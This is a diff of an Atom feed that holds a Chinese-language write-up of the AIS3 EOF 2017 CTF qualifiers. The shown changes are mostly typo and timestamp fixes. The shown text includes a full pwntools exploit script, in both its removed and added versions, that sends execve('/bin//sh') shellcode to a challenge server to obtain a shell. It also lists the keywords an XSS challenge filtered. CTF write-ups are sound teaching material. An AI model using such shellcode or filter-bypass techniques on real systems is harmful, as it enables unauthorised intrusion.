@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://blog.kaibro.tw/"/>
-  <updated>2018-01-16T06:51:46.000Z</updated>
+  <updated>2018-01-16T07:00:14.000Z</updated>
   <id>http://blog.kaibro.tw/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://blog.kaibro.tw/2018/01/16/AIS3-EOF-2017-%E5%88%9D%E8%B3%BD/"/>
     <id>http://blog.kaibro.tw/2018/01/16/AIS3-EOF-2017-初賽/</id>
     <published>2018-01-15T16:53:52.000Z</published>
-    <updated>2018-01-16T06:51:46.000Z</updated>
+    <updated>2018-01-16T07:00:14.000Z</updated>
     <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這場比賽是跟台大、交大、台科大三校的計算機安全課程期末考一起辦的</p>
 <p>然後任何人都可以報名參加</p>
 <p>前十名的隊伍可以進決賽</p>
@@ -28,7 +28,7 @@
 <p>所以Pwn的解題狀況蠻慘的</p>
 <p><code>Magicheap2</code>這種一堆人解掉的題目，我們就解不出來</p>
 <a id="more"></a>
-<h3 id="writeme"><a href="#writeme" class="headerlink" title="writeme"></a>writeme</h3><p>這題可以把你輸入位址得值印出來</p>
+<h3 id="writeme"><a href="#writeme" class="headerlink" title="writeme"></a>writeme</h3><p>這題可以把你輸入位址的值印出來</p>
 <p>然後可以蓋掉這個位址的值</p>
 <p>整個就很水，輕鬆任意讀寫</p>
 <p>直接Hijack got就行惹</p>
@@ -68,7 +68,7 @@
 <p>例如：</p>
 <p><code>\x32\x3e</code> =&gt; <code>xor bh,BYTE PTR [rsi]</code></p>
 <p><code>\x34\x35</code> =&gt; <code>xor al,0x35</code></p>
-<p><code>\x32\x36</code> =&gt; <code>xor al,0x35</code></p>
+<p><code>\x32\x36</code> =&gt; <code>xor dh,BYTE PTR [rsi]</code></p>
 <p><code>\x32\x38</code> =&gt; <code>xor bh,BYTE PTR [rax]</code></p>
 <p><code>\x31\xf6</code> =&gt; <code>xor esi,esi</code></p>
 <p>塞這種在開頭，後面就能多串2 Bytes shellcode</p>
@@ -80,7 +80,7 @@
 <p>Debug速度太慢+上電腦剛好爛掉，比完才發現syscall時rsi忘記清乾淨</p>
 <p>改了2 Bytes，換成<code>\x31\xf6</code>就成功拿到shell惹</p>
 <p>exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">r = remote(<span class="string">"35.201.132.60"</span>, <span class="number">12001</span>)</div><div class="line"></div><div class="line">nop = <span class="string">"\x32\x2e"</span></div><div class="line">nop2 = <span class="string">"\x34\x35"</span></div><div class="line">nop3 = <span class="string">"\x32\x36"</span></div><div class="line">nop4 = <span class="string">"\x32\x38"</span></div><div class="line"></div><div class="line">rsi_zero = <span class="string">"\x31\xf6"</span></div><div class="line"></div><div class="line"><span class="comment"># \xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05</span></div><div class="line">payload = <span class="string">"87\x5d"</span>+nop3+<span class="string">"\x5d\xf7\xe6"</span> + rsi_zero + <span class="string">"\x48\xbf\x2f\x62\x69\x6e126 \x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">r.sendline(<span class="string">"183"</span>)</div><div class="line">r.sendline(<span class="string">"86"</span>)</div><div class="line">r.sendline(<span class="string">"177"</span>)</div><div class="line">r.sendline(<span class="string">"115"</span>)</div><div class="line">r.sendline(<span class="string">"193"</span>)</div><div class="line">r.sendline(<span class="string">"135"</span>)</div><div class="line">r.sendline(<span class="string">"186"</span>)</div><div class="line">r.sendline(<span class="string">"92"</span>)</div><div class="line">r.sendline(<span class="string">"49"</span>)</div><div class="line">r.sendline(<span class="string">"21"</span>)</div><div class="line">r.sendline(<span class="string">"162"</span>) <span class="comment"># 11</span></div><div class="line">r.send(payload)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"126 "</span>) <span class="comment"># use 4 bytes to leak stack address</span></div><div class="line">s = u64(r.readline()[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"Stack: "</span>, hex(s)</div><div class="line"></div><div class="line">target = s - <span class="number">64</span> + <span class="number">11</span> * <span class="number">3</span> - <span class="number">3</span></div><div class="line"><span class="keyword">print</span> <span class="string">"target: "</span>,hex(target)</div><div class="line">r.send(p64(target) + <span class="string">"aaaa"</span>)</div><div class="line">sleep(<span class="number">0.1</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">r = remote(<span class="string">"35.201.132.60"</span>, <span class="number">12001</span>)</div><div class="line"></div><div class="line">nop = <span class="string">"\x32\x2e"</span></div><div class="line">nop2 = <span class="string">"\x34\x35"</span></div><div class="line">nop3 = <span class="string">"\x32\x36"</span></div><div class="line">nop4 = <span class="string">"\x32\x38"</span></div><div class="line">rsi_zero = <span class="string">"\x31\xf6"</span></div><div class="line"></div><div class="line"><span class="comment"># \xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05</span></div><div class="line">payload = <span class="string">"87\x5d"</span> + nop3 + <span class="string">"\x5d\xf7\xe6"</span> + rsi_zero + <span class="string">"\x48\xbf\x2f\x62\x69\x6e126 \x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">r.sendline(<span class="string">"183"</span>)</div><div class="line">r.sendline(<span class="string">"86"</span>)</div><div class="line">r.sendline(<span class="string">"177"</span>)</div><div class="line">r.sendline(<span class="string">"115"</span>)</div><div class="line">r.sendline(<span class="string">"193"</span>)</div><div class="line">r.sendline(<span class="string">"135"</span>)</div><div class="line">r.sendline(<span class="string">"186"</span>)</div><div class="line">r.sendline(<span class="string">"92"</span>)</div><div class="line">r.sendline(<span class="string">"49"</span>)</div><div class="line">r.sendline(<span class="string">"21"</span>)</div><div class="line">r.sendline(<span class="string">"162"</span>) <span class="comment"># 11</span></div><div class="line">r.send(payload)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"126 "</span>) <span class="comment"># use 4 bytes to leak stack address</span></div><div class="line">s = u64(r.readline()[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"Stack: "</span>, hex(s)</div><div class="line"></div><div class="line">target = s - <span class="number">64</span> + <span class="number">11</span> * <span class="number">3</span> - <span class="number">3</span></div><div class="line"><span class="keyword">print</span> <span class="string">"target: "</span>,hex(target)</div><div class="line">r.send(p64(target) + <span class="string">"aaaa"</span>)</div><div class="line">sleep(<span class="number">0.1</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
 <p><code>FLAG{THIS_challenge_is_too_easy_QQ}</code></p>
 <p><br></p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Web部分主要是我負責的</p>
@@ -92,7 +92,7 @@
 <p>我以為要自己寫code算 (懶</p>
 <p>沒想到旁邊那個按鈕點下去就會開始算惹</p>
 <p>這題很多地方都可以XSS，例如username顯示的地方和寄信的內容</p>
-<p>可是我們主要是要XSS admin，可是信件的usernmae不能XSS</p>
+<p>可是我們主要是要XSS admin，但信件的usernmae不能XSS</p>
 <p>所以目標很明確是在內容部分</p>
 <p>比較麻煩的地方是，這題擋了很多東西，例如：</p>
 <p><code>&lt;script</code>, <code>&lt;iframe</code>, <code>innerHTML</code>, <code>)</code>, <code>}</code>, <code>.open</code>, <code>document.write</code>, <code>onerror</code>, <code>XMLHttprequest</code>…</p>
@@ -198,7 +198,7 @@
 <h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>Reverse主要都是另一個隊友在解</p>
 <p>我花比較多時間的，是在踩地雷那題</p>
 <h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><p>一開始scanf要打<code>&quot;zero&quot;</code></p>
-<p>然後call 要跳到XDDD()</p>
+<p>然後call 要跳到<code>XDDD()</code></p>
 <p>環境變數要叫做<code>&quot;rockman&quot;</code></p>
 <p>繞過debugger偵測</p>
 <p>打開notepad</p>
